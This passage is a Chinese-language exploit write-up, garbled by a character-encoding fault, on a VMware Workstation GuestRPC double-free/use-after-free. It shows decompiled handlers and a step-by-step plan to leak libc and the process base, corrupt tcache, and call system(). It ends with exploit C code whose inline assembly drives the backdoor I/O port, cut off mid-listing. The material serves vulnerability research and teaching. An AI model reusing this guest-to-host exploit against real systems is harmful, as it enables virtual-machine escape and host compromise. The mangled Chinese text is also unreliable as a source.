alt="å›¾ç‰‡.png"></p><p>å°‘äº†ä¸€å¤„è¢«ç½®ä¸º0çš„æ“ä½œï¼Œè¿˜æœ‰ä¸€å¤„andæ“ä½œä¿®æ”¹ï¼ŒæŸ¥çœ‹æ•´ä¸ªå‡½æ•°ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯<code>GuestMsg: Channel</code>ä¹‹ç±»çš„ä¸œè¥¿ï¼Œä»¥åŠä¸Šé¢çš„switchæ“ä½œï¼Œæ­¤å¤–æŠ¥é”™éƒ½æ˜¯ä¸€äº›åè®®é”™è¯¯ä»¥åŠæ ¼å¼ä¹‹ç±»çš„ä¸œè¥¿ï¼ŒçŒœæµ‹è¿™é‡Œæ˜¯RPCæŒ‡ä»¤çš„å¤„ç†å‡½æ•°ã€‚</p><p>ç„¶åæˆ‘å°±ä¸€å¤´æ‰è¿›äº†open-vmçš„æºç ï¼Œï¼Œã€‚ã€‚</p><p>çœ‹äº†éå¸¸ä¹…ï¼Œå¤§æ¦‚å¾—å‡ºä¸€ä¸ªç»“æ„ä½“çš„æ¨¡å‹</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-61000bff1bf24027f6e26da3bdf1ea5dfc805946.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä¸­å¤§éƒ¨åˆ†çš„æ“ä½œè¿˜çœ‹ä¸å¤ªæ‡‚ï¼Œç„¶åçªç„¶æƒ³èµ·æ¥æŸ¥çœ‹GuestRPC çš„æ“ä½œæµç¨‹ã€‚</p><ul><li>æ‰“å¼€ GuestRPC é€šé“</li><li>å‘é€å‘½ä»¤é•¿åº¦</li><li>å‘é€å‘½ä»¤æ•°æ®</li><li>æ¥æ”¶å›å¤å¤§å°</li><li>æ¥æ”¶å›å¤æ•°æ®</li><li>å‘å‡ºæ¥æ”¶ç»“æŸä¿¡å·</li><li>å…³é—­é¢‘é“</li></ul><p>å‘ç°å¯ä»¥å’Œè¿™é‡Œçš„switchå¯¹åº”èµ·æ¥ï¼Œå¯ä»¥æ›´åŠ æ¸…é™¤çš„ç†è§£å…¶å†…å®¹ã€‚</p><p>è¿™é‡Œå»æ‰äº†ç½®0æ“ä½œï¼Œæ²¡æœ‰å°†ç¬¬ä¸€å¤„bufç½®ç©ºï¼Œç¬¬äºŒå¤„æŠŠæ ‡å¿—æ”¹ä¸ºäº†21ï¼Œè¿™é‡Œå¯èƒ½æ˜¯æ¼æ´å½¢æˆçš„é‡ç‚¹ã€‚</p><p>æ ¹æ®æ­£å¸¸æµç¨‹ï¼Œç›®æ ‡å¤„è°ƒç”¨çš„æ˜¯è¿™æ ·ä¸€ä¸ªå‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">close_backdoor</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int16 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">free</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>a3 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_176D90</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_55A0E0</span><span class="token punctuation">(</span><span class="token string">"GuestRpc: Closing RPCI backdoor channel %u after send completion\n"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_189FE0</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªifåˆ†æ”¯æ˜¯freeæ‰a1+8ä½ç½®çš„bufï¼Œè¦æ±‚æ˜¯a3 and 0x20!&#x3D;0ï¼Œè¿™å°±åˆšå¥½å’Œpatchçš„åœ°æ–¹ç›¸ç¬¦åˆï¼Œè¿™é‡Œä¼šå¯¼è‡´ä¸€æ¬¡freeã€‚</p><p>æ­¤å¤„é‡Šæ”¾çš„ç¼“å†²åŒºæ˜¯åç§»ä¸º8çš„åœ°æ–¹çš„ç¼“å†²åŒºï¼Œè¯¥ç¼“å†²åŒºå¯¹åº”äºå†…éƒ¨ç”¨äºå­˜å‚¨ä¼ é€’å›ç”¨æˆ·çš„å›å¤æ•°æ®çš„ç¼“å†²åŒºã€‚</p><p>åŒæ—¶åœ¨switch&#x3D;6çš„æ—¶å€™ï¼Œæ­¤å¤„ä¼šå†æ¬¡é‡Šæ”¾ï¼Œè¿™å°±å¯¼è‡´äº†DFå­˜åœ¨ï¼Œè€Œåœ¨è¿™ä¸ªDFçš„ä¸­é—´ï¼Œé‡å¤ä½¿ç”¨è¯¥åŒºåŸŸï¼Œå¯ä»¥åˆ©ç”¨ä¸ºUAFã€‚</p><p>ä¸‹é¢å°±æœ‰äº†åŸºæœ¬çš„æ€è·¯</p><ul><li>leak</li><li>æ›´æ”¹tcacheçš„fd</li><li>è·å–<code>rip</code>æ§åˆ¶<code>rdi</code>è°ƒç”¨<code>system(&quot;/usr/bin/xcalc &amp;&quot;)</code></li></ul><p>åœ¨æ­¤guestrpcçš„åŒºé—´å†…ï¼Œå¯¹å †çš„æ“ä½œéå¸¸å°‘ï¼Œæ‰€ä»¥è¯¥æ¼æ´åˆ©ç”¨ä¹Ÿæ˜¯æ¯”è¾ƒç¨³å›ºçš„ã€‚</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>leakæ“ä½œåˆ©ç”¨çš„æ˜¯æ¯”è¾ƒè€å¥—çš„uafåˆ©ç”¨</p><ul><li>åˆ†é…ä¸‰ä¸ªé€šé“ [A]ã€[B] å’Œ [C]</li><li>å°†å‘½ä»¤å‘é€<code>info-set</code>åˆ°é€šé“ [A]</li><li>æ‰“å¼€é€šé“ [B] å¹¶å‘å‡º a <code>info-get</code>ä»¥æ£€ç´¢æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„æ•°æ®</li><li>åœ¨é€šé“ [B] ä¸Šå‘å‡ºå›å¤é•¿åº¦å’Œå›å¤è¯»å–å‘½ä»¤</li><li>åœ¨é€šé“ [B] ä¸Šè°ƒç”¨é”™è¯¯çš„ finalize å‘½ä»¤ï¼Œé‡Šæ”¾åº•å±‚çš„å›å¤ç¼“å†²åŒº</li><li>åœ¨é€šé“ [C] ä¸Šè°ƒç”¨<code>info-get</code>å¹¶æ¥æ”¶å›å¤é•¿åº¦ï¼Œå®ƒåœ¨æˆ‘ä»¬åˆšåˆšåˆ†é…çš„åŒä¸€åœ°å€åˆ†é…ä¸€ä¸ªç¼“å†²åŒº</li><li>å…³é—­é€šé“ [B]ï¼Œå†æ¬¡é‡Šæ”¾ç¼“å†²åŒº</li><li>é˜…è¯»é¢‘é“[C]ä¸Šçš„å›å¤ä»¥æ³„éœ²æˆ‘ä»¬çš„æ•°æ®</li></ul><p>ä½†æ˜¯åœ¨channel Cä¸Šå½¢æˆçš„uafï¼Œå´å¹¶ä¸èƒ½åšåˆ°åœ¨tcacheä¸­æ³„éœ²æƒ³è¦çš„glibcåœ°å€ï¼Œæ‰€ä»¥åœ¨æ­¤åŸºç¡€ä¸Šè¿˜éœ€è¦å¾€Cä¸­å¡«å…¥ä¸€äº›å¯ä»¥åˆ©ç”¨çš„åœ°å€ã€‚</p><p>è¿™æ—¶å€™è€ƒè™‘åˆ°2017å¹´çš„ä¸€ä¸ªcveï¼Œé€šè¿‡dnd_versioné€ æˆvtableçš„leakã€‚</p><p>åˆ†ædnd_versionå¦‚ä¸‹ã€‚idaä¸­æœç´¢<code>vmx.capability.dnd_version</code>ï¼Œæ‰¾åˆ°å¯¹åº”çš„bindå‡½æ•°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a3f065bd71745da225b1c04c4a6d034e89f421c8.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä»–çš„RPCå‘½ä»¤ç±»ä¼¼ï¼Œåœ¨å‘é€â€œvmx.capability.dnd_versionâ€å‘½ä»¤çš„æ—¶å€™ï¼Œå¯¹åº”çš„å¤„ç†å‡½æ•°ä¸­å¦‚æœå‘ç°å½“å‰ç‰ˆæœ¬å’Œè®¾ç½®çš„ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•°åˆ›å»ºæ–°çš„ objectï¼ŒæŠŠåŸæ¥çš„ç‰ˆæœ¬çš„objecté”€æ¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1116D0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> __int64 reply<span class="token punctuation">,</span> __int64 reply_len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// er12</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h] BYREF</span>  <span class="token keyword">int</span> v13<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-2Ch] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a4 <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"1 argument expected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_5611D0</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Non-integer argument"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Invalid protocol version."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_171460</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">sub_4723A0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_472380</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1711E0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_12FA20</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Failed to set VMDB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token function">Tools_SetGuestDnDCapable</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä¼ å…¥ä¸€ä¸ªå‚æ•°ä»£è¡¨ç‰ˆæœ¬ï¼Œå¦‚æœä¸ç¬¦åˆåˆ™é”€æ¯ä¹‹å‰çš„ç»“æ„ä½“ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç»“æ„ä½“ã€‚æ›´æ–°åœ¨<code>vmx.capability.dnd_version</code>ä¹Ÿæœ‰å¯¹åº”å®ç°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" alt="å›¾ç‰‡.png"></p><p>è¿½è¸ªå‡½æ•°</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" alt="å›¾ç‰‡.png"></p><p>é‚£ä¹ˆå¯ä»¥çŒœåˆ°æ–°çš„ç»“æ„ä½“å¤§å°æ€»æ˜¯ä¸º0xa8ã€‚å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•ï¼Œæ§åˆ¶bufçš„å¤§å°ä¸º0xa8ï¼Œé”€æ¯åŸæ¥çš„objectè·å¾—æ–°çš„objectçš„æ—¶å€™ï¼ŒæŠŠchannel Bçš„UAF chunkç”³è¯·å‡ºæ¥ï¼Œç„¶ååˆ©ç”¨channel C leak libcåŸºå€ã€‚</p><p>æœ‰äº†leakï¼Œåˆ©ç”¨èµ·æ¥å°±ç®€å•äº†ï¼Œç›´æ¥æ”¹fdï¼Œç„¶ååŠ«æŒåˆ°bssæ®µï¼Œæ”¹æ‰æŸä¸€ä¸ªå‡½æ•°æŒ‡é’ˆä¸ºsystemå³å¯ã€‚</p><p>æ–°çš„leakæ–¹å¼å¦‚ä¸‹</p><ul><li>å¼€å¯channel Aå’Œchannel B</li><li>Açš„è¾“å‡ºç¼“å†²åŒºä¸ºbufA,Aåˆ©ç”¨æ¼æ´free bufA</li><li>ç„¶åBç»™guestå‘é€out putï¼Œè¿™æ—¶å€™æ§åˆ¶Bçš„bufå¤§å°å’ŒAä¸€æ ·ï¼Œæ­¤æ—¶freeçš„Aå†æ¬¡è¢«mallocå‡ºæ¥</li><li>é‡Šæ”¾Aï¼ŒåŒæ—¶buf Aè¢«å†æ¬¡é‡Šæ”¾ï¼Œæ­¤æ—¶è°ƒç”¨<code>vmx.capability.dnd_version</code>ï¼Œè™šè¡¨åœ¨æ­¤æ—¶è¢«å†™å…¥bufB</li><li>leakå‡ºprocess base ç„¶åæ ¹æ®åç§»å³å¯è®¡ç®—å‡ºsystem ä»¥åŠä¸€äº›å‡½æ•°æŒ‡é’ˆçš„åœ°å€ã€‚</li></ul><p>æœ€åä»¥ç›¸åŒçš„æ–¹å¼ï¼ŒåŠ«æŒfdå³å¯,ä¸‹é¢çš„expæ˜¯é•¿äº­å¸ˆå‚…çš„ï¼Œæ ¹æ®é€šä¿¡åŸç†å®ç°äº†ä¸€å¥—é€šä¿¡æœºåˆ¶ï¼Œå…·ä½“å†…å®¹çœ‹å‚è€ƒï¼Œä¸èµ˜è¿°ã€‚</p><p>expï¼š</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0xc9435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token 